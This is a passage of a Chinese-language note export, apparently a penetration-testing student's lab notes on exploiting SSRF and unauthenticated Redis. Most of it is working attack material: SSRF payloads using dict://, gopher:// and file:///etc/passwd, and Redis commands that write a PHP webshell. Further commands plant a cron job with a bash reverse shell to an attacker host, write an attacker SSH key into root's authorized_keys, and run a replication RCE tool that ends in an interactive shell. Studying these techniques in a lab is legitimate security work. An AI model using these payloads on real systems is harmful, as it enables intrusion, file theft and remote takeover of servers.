nceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164395-p008paw","Type":"NodeParagraph","Properties":{"id":"20240919164395-p008paw","updated":"20240919164395"},"Children":[{"Type":"NodeText","Data":"3、攻击内网的应用程序或服务"}]},{"ID":"20240919164396-9x2gqu6","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164396-9x2gqu6","updated":"20240919164396"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://192.168.188.129/ssrf3.php?url=dict://192.168.188.130:6379/info   搭配协议\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164397-9vihf43","Type":"NodeParagraph","Properties":{"id":"20240919164397-9vihf43","updated":"20240919164397"},"Children":[{"Type":"NodeText","Data":"4、作为跳板机攻击内网"}]},{"ID":"20240919164398-3z53ksm","Type":"NodeParagraph","Properties":{"id":"20240919164398-3z53ksm","updated":"20240919164398"},"Children":[{"Type":"NodeText","Data":"5、无视CDN（内容分发网络）"}]},{"ID":"20240919164399-iwop3u0","Type":"NodeParagraph","Properties":{"id":"20240919164399-iwop3u0","updated":"20240919164399"},"Children":[{"Type":"NodeText","Data":"直接通过ssrf漏洞获取真实Ip地址，运气好直接进入内网"}]},{"ID":"20240919164400-1zyounz","Type":"NodeParagraph","Properties":{"id":"20240919164400-1zyounz","updated":"20240919164400"},"Children":[{"Type":"NodeText","Data":"6、读文件"}]},{"ID":"20240919164401-dt5usft","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164401-dt5usft","updated":"20240919164401"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://192.168.188.129/ssrf3.php?url=file:///etc/passwd\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164402-soobl6t","Type":"NodeParagraph","Properties":{"id":"20240919164402-soobl6t","updated":"20240919164402"},"Children":[{"Type":"NodeText","Data":"7、SSRF结合XXE  进行端口探测"}]},{"ID":"20240919164403-zsabx8q","Type":"NodeParagraph","Properties":{"id":"20240919164403-zsabx8q","updated":"20240919164403"},"Children":[{"Type":"NodeImage","Properties":{"id":""},"Children":[{"Type":"NodeBang","Data":"!","Properties":{"id":""}},{"Type":"NodeOpenBracket","Data":"[","Properties":{"id":""}},{"Type":"NodeLinkText","Data":"image-20240919151631314","Properties":{"id":""}},{"Type":"NodeCloseBracket","Data":"]","Properties":{"id":""}},{"Type":"NodeOpenParen","Data":"(","Properties":{"id":""}},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240919151631314.png","Properties":{"id":""}},{"Type":"NodeCloseParen","Data":")","Properties":{"id":""}}]}]},{"ID":"20240919164404-5pi894b","Type":"NodeParagraph","Properties":{"id":"20240919164404-5pi894b","updated":"20240919164404"},"Children":[{"Type":"NodeText","Data":"8 redis结合gopher协议进行SSRF漏洞攻击"}]},{"ID":"20240919164405-tnwuel3","Type":"NodeParagraph","Properties":{"id":"20240919164405-tnwuel3","updated":"20240919164405"},"Children":[{"Type":"NodeText","Data":"gopher协议"}]},{"ID":"20240919164406-ab41o6h","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164406-ab41o6h","updated":"20240919164406"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"gopher://\u003cIP\u003e:\u003c端口\u003e/_数据     #注意   _可以被除了$以外的任意字符替换\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164407-rr16zoh","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164407-rr16zoh","updated":"20240919164407"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"GET / HTTP/1.1\nHost:192.168.188.130\t\t\n\n第一次URL编码：\nget%20%2f%20http%2f1.1%0ahost%3a192.168.188.130\n第二次URL编码：\ngopher://192.168.188.130:80/_get%2520%252f%2520http%252f1.1%250ahost%253a192.168.188.130\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164408-j8yxzff","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164408-j8yxzff","updated":"20240919164408"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"POST / HTTP/1.1\nHost: 192.168.188.129\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 2\n\nurl编码两次后的内容：\npost%2520%252f%2520http%252f1.1%250ahost%253a%2520192.168.188.129%250acontent-type%253a%2520application%252fx-www-form-urlencoded%250acontent-length%253a%25202\n\ngopher://192.168.188.130:80/_post%2520%252f%2520http%252f1.1%250ahost%253a%2520192.168.188.129%250acontent-type%253a%2520application%252fx-www-form-urlencoded%250acontent-length%253a%25202\n\n\npayload:\nhttp://192.168.188.129/ssrf3.php?url=gopher%3A%2F%2F192.168.188.130%3A80%2F_post%252520%25252f%252520http%25252f1.1%25250ahost%25253a%252520192.168.188.129%25250acontent-type%25253a%252520application%25252fx-www-form-urlencoded%25250acontent-length%25253a%2525202\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164409-is6oq6g","Type":"NodeParagraph","Properties":{"id":"20240919164409-is6oq6g","updated":"20240919164409"},"Children":[{"Type":"NodeText","Data":"利用的前提条件："}]},{"ID":"20240919164410-j5ye4bm","Type":"NodeParagraph","Properties":{"id":"20240919164410-j5ye4bm","updated":"20240919164410"},"Children":[{"Type":"NodeText","Data":"1、redis服务需要有未授权，并且有root权限，redis.conf配置文件内的bind 0.0.0.0   protected-mode no"}]},{"ID":"20240919164411-2plyft9","Type":"NodeParagraph","Properties":{"id":"20240919164411-2plyft9","updated":"20240919164411"},"Children":[{"Type":"NodeText","Data":"2、gopher协议可以用"}]},{"ID":"20240919164412-ks724m5","Type":"NodeParagraph","Properties":{"id":"20240919164412-ks724m5","updated":"20240919164412"},"Children":[{"Type":"NodeText","Data":"3、知道web根目录"}]},{"ID":"20240919164413-a3jgxkq","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240919164413-a3jgxkq","updated":"20240919164413"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"redis常见的攻击方式："}]},{"ID":"20240919164414-5p75eco","Type":"NodeParagraph","Properties":{"id":"20240919164414-5p75eco","updated":"20240919164414"},"Children":[{"Type":"NodeText","Data":"1、绝对路径写webshell   /var/www/html   ---前提：redis服务器有web服务，能解析你的木马"}]},{"ID":"20240919164415-unspbz7","Type":"NodeParagraph","Properties":{"id":"20240919164415-unspbz7","updated":"20240919164415"},"Children":[{"Type":"NodeText","Data":"2、写ssh公私密钥"}]},{"ID":"20240919164416-m1bq6uy","Type":"NodeParagraph","Properties":{"id":"20240919164416-m1bq6uy","updated":"20240919164416"},"Children":[{"Type":"NodeText","Data":"3、写计划任务（redis服务没有web服务的）  contrab"}]},{"ID":"20240919164417-go0974e","Type":"NodeParagraph","Properties":{"id":"20240919164417-go0974e","updated":"20240919164417"},"Children":[{"Type":"NodeText","Data":"4、主从复制RCE（自动工具）"}]},{"ID":"20240919164418-ynn9ici","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240919164418-ynn9ici","updated":"20240919164418"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"写webshell"}]},{"ID":"20240919164419-ncykvin","Type":"NodeParagraph","Properties":{"id":"20240919164419-ncykvin","updated":"20240919164419"},"Children":[{"Type":"NodeText","Data":"方法1："}]},{"ID":"20240919164420-7zesnza","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164420-7zesnza","updated":"20240919164420"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"靶场:0\u003econfig get dir\n1) \"dir\"\n2) \"/root\"\n靶场:0\u003econfig set dir /var/www/html\n\"OK\"\n靶场:0\u003econfig set dbfilename shell1.php\n\"OK\"\n靶场:0\u003eset xxx '\u003c?php phpinfo();?\u003e'\n\"OK\"\n靶场:0\u003esave\n\"OK\"\n靶场:0\u003e\n\n通过工具链接数据库执行命令写webshell\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164421-9duywsi","Type":"NodeParagraph","Properties":{"id":"20240919164421-9duywsi","updated":"20240919164421"},"Children":[{"Type":"NodeText","Data":"方法2：通过协议dict://"}]},{"ID":"20240919164422-csbtyrw","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164422-csbtyrw","updated":"20240919164422"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"/ssrf3.php?url=dict://192.168.188.130:6379/config%20get%20dir\n/ssrf3.php?url=dict://192.168.188.130:6379/config%20set%20dbfilename%20shell2.php\n/ssrf3.php?url=dict://192.168.188.130:6379/set%20yyy%20\"\\n\\n\\n\u003c`phpinfo();`\u003e\\n\\n\\n\\n\"\n/ssrf3.php?url=dict://192.168.188.130:6379/save\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164423-lub2h99","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164423-lub2h99","updated":"20240919164423"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"无回显或者无web服务的，写计划任务"}]},{"ID":"20240919164424-blabb7i","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164424-blabb7i","updated":"20240919164424"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"靶场:0\u003econfig get dir\n1) \"dir\"\n2) \"/var/www/html\"\n靶场:0\u003econfig set dir /var/spool/cron\n\"OK\"\n靶场:0\u003econfig set dbfilename root\n\"OK\"\n靶场:0\u003eset xxax  \"\\n\\n\\n*/1 * * * * /bin/bash -i\u003e\u0026/dev/tcp/192.168.188.131/8888 0\u003e\u00261\\n\\n\"\n\"OK\"\n靶场:0\u003esave\n\"OK\"\n靶场:0\u003e\n\n\n注意：部分ubantu系统需要写入的计划任务有600权限才能执行，默认写入644权限，\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164425-rohewxx","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164425-rohewxx","updated":"20240919164425"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"写公钥"}]},{"ID":"20240919164426-0gppj5v","Type":"NodeParagraph","Properties":{"id":"20240919164426-0gppj5v","updated":"20240919164426"},"Children":[{"Type":"NodeText","Data":"1、开启了公钥登录"}]},{"ID":"20240919164427-0qdicpp","Type":"NodeParagraph","Properties":{"id":"20240919164427-0qdicpp","updated":"20240919164427"},"Children":[{"Type":"NodeText","Data":"2、文件可成功覆盖写入"}]},{"ID":"20240919164428-u66l6x7","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164428-u66l6x7","updated":"20240919164428"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"靶场:0\u003econfig get dir\n1) \"dir\"\n2) \"/var/spool/cron\"\n靶场:0\u003econfig set dir /root/.ssh\n\"OK\"\n靶场:0\u003eset dbfilename authorized_keys\n\"OK\"\n靶场:0\u003eset mad \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDF1pTkERANgoec7whhuftZlhYbEHlJv/stjHzRdnyg+o6O8IcT/dVBNq8tnR5Hdc2cEUft8cpdBnfREgnelYM9RpXNrlnzijMuaC5AjtpTlzKxrNZ5b5vfcQPgtT8Iv+OJWfNEcC27u4BMf3ErBHG8DT7IOQXtdbnypuuqhpcCCyGiB8vMTu2aQcqqSO3Ck5z8HcwR2LyQvxyF1qE6z7YD9Pa6g01GF6QRWSssFH0sgLMDzHa5+dofZ+5YH2xaoGTaqyCyKSkREbco6QTu+ujrFg1Jk/z09RulfMWj8IkgXDca1jxuGvyc+gWbhSoQ0HZFYu8pRNRZvg+s7m7NoefkfV5A8b024bXhyy74Hxt5TsypsDcyRWEoV2IH4o+vzpFls5i+t5JCpYP2yPUIbm3koEs+ta1JfEXBpcK2RRH2bCCjuRR54GD66XCUUiNyIQ1Mvkep4OmkhcoqcfxQi7o/Ssocw5v40a0dW7jRhc4LdqElpClWWs26d24MnB7E24U= root@kali\"\n\"OK\"\n靶场:0\u003esave\n\"OK\"\n靶场:0\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164429-qony03o","Type":"NodeParagraph","Properties":{"id":"20240919164429-qony03o","updated":"20240919164429"},"Children":[{"Type":"NodeImage","Properties":{"id":""},"Children":[{"Type":"NodeBang","Data":"!","Properties":{"id":""}},{"Type":"NodeOpenBracket","Data":"[","Properties":{"id":""}},{"Type":"NodeLinkText","Data":"image-20240919162024380","Properties":{"id":""}},{"Type":"NodeCloseBracket","Data":"]","Properties":{"id":""}},{"Type":"NodeOpenParen","Data":"(","Properties":{"id":""}},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240919162024380.png","Properties":{"id":""}},{"Type":"NodeCloseParen","Data":")","Properties":{"id":""}}]}]},{"ID":"20240919164430-18eob11","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240919164430-18eob11","updated":"20240919164430"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"###### ","Properties":{"id":""}},{"Type":"NodeText","Data":"3、主从复制RCE"}]},{"ID":"20240919164431-b4mssn6","Type":"NodeParagraph","Properties":{"id":"20240919164431-b4mssn6","updated":"20240919164431"},"Children":[{"Type":"NodeText","Data":"扩展："}]},{"ID":"20240919164432-ii3x4ib","Type":"NodeParagraph","Properties":{"id":"20240919164432-ii3x4ib","updated":"20240919164432"},"Children":[{"Type":"NodeText","Data":"redis  A   主服务器"}]},{"ID":"20240919164433-5voqx61","Type":"NodeParagraph","Properties":{"id":"20240919164433-5voqx61","updated":"20240919164433"},"Children":[{"Type":"NodeText","Data":"B  备用服务器\t\t\tA.B存储的数据是相同的，只是一个负责读，一个负责写；减轻流量压力，提升效率"}]},{"ID":"20240919164434-8sq8p5y","Type":"NodeParagraph","Properties":{"id":"20240919164434-8sq8p5y","updated":"20240919164434"},"Children":[{"Type":"NodeText","Data":"redis 4.？版本后新增了拓展模块，可利用该模块进行主从复制RCE"}]},{"ID":"20240919164435-b95whln","Type":"NodeParagraph","Properties":{"id":"20240919164435-b95whln","updated":"20240919164435"},"Children":[{"Type":"NodeText","Data":"生成动态链接库的地址：https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git"}]},{"ID":"20240919164436-y2i9sfq","Type":"NodeParagraph","Properties":{"id":"20240919164436-y2i9sfq","updated":"20240919164436"},"Children":[{"Type":"NodeText","Data":"工具地址：https://github.com/Ridter/redis-rce"}]},{"ID":"20240919164437-c3qvz49","Type":"NodeParagraph","Properties":{"id":"20240919164437-c3qvz49","updated":"20240919164437"},"Children":[{"Type":"NodeText","Data":"用法"}]},{"ID":"20240919164438-ybw9p8t","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164438-ybw9p8t","updated":"20240919164438"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"┌──(root㉿kali)-[~/.ssh/redis-rce]\n└─# python redis-rce.py -r 192.168.188.130 -p 6379 -L 192.168.188.131 -f module.so\n\n█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   \n█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  \n█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    \n█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ \n  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   \n ▀                                     ▀                   \n\n\n[*] Connecting to  192.168.188.130:6379...\n[*] Sending SLAVEOF command to server\n[+] Accepted connection from 192.168.188.130:6379\n[*] Setting filename\n[+] Accepted connection from 192.168.188.130:6379\n[*] Start listening on 192.168.188.131:21000\n[*] Tring to run payload\n[+] Accepted connection from 192.168.188.130:34350\n[*] Closing rogue server...\n\n[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i\n[+] Interactive shell open , use \"exit\" to exit...\n\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]}]}